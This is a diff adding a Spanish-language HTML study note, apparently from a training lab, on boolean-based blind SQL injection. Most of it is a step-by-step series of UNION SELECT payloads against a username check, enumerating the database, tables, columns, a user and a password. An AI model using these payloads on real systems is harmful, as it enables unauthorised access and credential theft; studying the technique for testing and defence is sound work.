@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Blind SQLi - Boolean Based</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Blind SQLi - Boolean Based</h1><br/><p><strong>Basada en Boolean</strong> </p><p></p><p>La inyeccion SQL basada en booleanos se refiere a la respuesta que recibimos de nuestro intentos de inyeccion, que puede ser verdadero o falso, si o no, activado o desactivado, 1 o 0 o cualquier respuesta que solo pueda tener dos </p><p>resultados. Ese resultado confirma que nuestra carga util de inyeccion SQL fue exitosa o no.</p><p></p><p>Es como un ataque de diccionario pero en SQLi</p><p>A partir de la siguiente consulta SQL que verifica si el usuario existe, validando la respuesta obtenida TRUE o FALSE</p><p><code>select * from users where username = &#39;%username%&#39; LIMIT 1;</code></p><p>Se intenta identificar el numero de columnas</p><p><code>admin123&#39; UNION SELECT 1;-- </code></p><p><code>admin123&#39; UNION SELECT 1,2,3;-- </code></p><p>Se intenta identificar el nombre de la base de datos</p><p><code>admin123&#39; UNION SELECT 1,2,3 where database() like &#39;s%&#39;;--</code></p><p>Se intenta identificar el nombre de la tabla de usuarios</p><p><code>admin123&#39; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &#39;sqli_three&#39; and table_name like &#39;a%&#39;;--</code></p><p><code>admin123&#39; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &#39;sqli_three&#39; and table_name=&#39;users&#39;;--</code></p><p>Se intenta identificar las columnas de la tabla usuarios</p><p><code>admin123&#39;  UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE  TABLE_SCHEMA=&#39;sqli_three&#39; and TABLE_NAME=&#39;users&#39; and COLUMN_NAME like  &#39;a%&#39;;</code></p><p><code>admin123&#39;  UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE  TABLE_SCHEMA=&#39;sqli_three&#39; and TABLE_NAME=&#39;users&#39; and COLUMN_NAME like  &#39;a%&#39; and COLUMN_NAME !=&#39;id&#39;;</code></p><p>Se intenta identificar el usuario</p><p><code>admin123&#39; UNION SELECT 1,2,3 from users where username like &#39;a%</code></p><p>Se intenta identificar la password</p><p><code>admin123&#39; UNION SELECT 1,2,3 from users where username=&#39;admin&#39; and password like &#39;a%</code></p><p></p><p></p></div>
+</body>
+</html>
